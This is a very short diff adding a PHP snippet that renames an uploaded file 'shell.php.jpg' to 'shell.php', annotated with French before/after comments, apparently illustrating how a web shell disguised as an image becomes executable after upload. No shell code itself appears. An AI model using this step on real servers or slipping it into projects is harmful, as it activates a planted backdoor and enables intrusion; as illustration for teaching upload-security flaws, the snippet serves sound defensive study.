@@ -1,0 +1,3 @@
+<?php
+rename("uploads/shell.php.jpg", # AVANT
+       "uploads/shell.php");    # APRÈS
